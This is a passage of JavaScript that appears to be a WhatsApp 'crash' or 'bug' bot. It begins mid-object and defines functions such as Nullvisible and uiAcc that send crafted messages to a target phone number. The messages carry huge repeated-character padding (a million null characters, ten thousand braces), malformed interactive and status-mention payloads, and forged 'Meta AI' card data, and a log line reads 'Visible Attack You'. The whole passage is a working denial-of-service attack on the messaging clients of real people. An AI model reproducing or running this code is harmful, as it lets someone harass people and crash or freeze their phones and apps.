          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            remoteJid: "X",
            participant: target,
            stanzaId: "1234567890ABCDEF",
            mentionedJid: Mentioneds,
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "\u0000",
                      format: "DEFAULT",
                    },
                    nativeFlowResponseMessage: {
                      name: "call_permission_request",
                      paramsJson: "\×10".repeat(25000),
                      version: 3,
                    },
                  },
                },
              },
            },
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };
  
  const msg = generateWAMessageFromContent(target, message1, message2, {});

  await Dilz.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await Dilz.relayMessage(
      target, 
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      }, 
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: " null - exexute "
            },
            content: undefined
          }
        ]
      }
    );
  }
}

async function Nullvisible(Dilz, target) {
            await Dilz.relayMessage(target, {
            viewOnceMessage: {
            message: {
            interactiveResponseMessage: {
            body: {
            text: "visiblemoment",
            format: "DEFAULT"
                    },
            nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
            }
            }
            }
            }
            }, { participant: { jid: target}});
    
    console.log(chalk.yellow('Visible Attack You'));
}

async function uiAcc(xrelly, target) {
  return new Promise(async (resolve) => {
    let memek = "ꦽ".repeat(10000);
    let ProtoSock = JSON.stringify({
      type: "invoke",
      payload: {
        bot_id: "meta_ai",
        action: "send_card",
        recipient: {
          phone_number: target,
          name: "Meta AI"
        },
        card_data: {
          template_id: "show_cards_users",
          components: [
            {
              type: "header",
              parameters: {
                title: "",
                image: {
                  url: "https://mmg.whatsapp.net/v/t62.7118-24/530142719_1293392145516971_3436280522584024074_n.enc?ccb=11-4&oh=01_Q5Aa2QGLer6HhSJ0R8Wb6SP2iUqTdrhTHucmDXcaDLp8x15lgQ&oe=68C0297E&_nc_sid=5e03e0&mms3=true"
                }
              }
            },
            {
              type: "body",
              parameters: {
                text: "",
                variables: {
                  name: "ctp",
                  offer_code: "SHA_256"
                }
              }
            },
            {
              type: "button",
              parameters: [
                {
                  type: "single_select",
                  button_id: "btn_accept",
                  text: ""
                },
                {
                  type: "highlight_label",
                  button_id: "btn_decline",
                  text: ""
                }
              ]
            }
          ]
        },
        metadata: {
          request_id: "REQUEST_BY_OTHER",
          timestamp: null,
          source: "com.whatsapp"
        }
      }
    });

    let content = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            shop: 999,
            participant: { jid: target },
            remoteJid: "status@broadcast",
            expiration: 999,
            ephemeralSettingTimestamp: 100000,
            entryPointConversionSource: "cache",
            entryPointConversionApp: "Whatsapp",
            entryPointConversionDelaySeconds: 9670,
            disappearingMode: {
              initiator: "INITIATED_BY_OTHER",
              trigger: "ACCOUNT_STATUS"
            }
          },
          interactiveMessage: {
            header: {
              title: " -Dilz { 1st } " + memek,
              hasMediaAttachment: false
            },
            body: {
              text: "Dilz ~ demonicorex"
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net"
              },
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "{             1.}"
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: ProtoSock
                },
                {
                  name: "payment_info",
                  buttonParamsJson: "{\"currency\":\"USD\",\"amount\":{\"value\":null,\"offset\":100},\"payment_type\":\"upi\",\"payment_configuration\":\"merchant_config_123\",\"transaction_id\":\"TX1234567890\",\"status\":\"null\",\"note\":\"-xrelly\"}"
                },
                {
                  name: "account_type",
                  buttonParamsJson: ProtoSock
                }
              ]
            }
          }
        }
      }
    },
    { isAnimated: true }
  );

    await Dilz.relayMessage(target, content.message, {
      messageId: null,
      participant: { jid: target }
    });

    setTimeout(() => resolve(), 1000);
  });
}
///----------( Stop A Function )----------\\\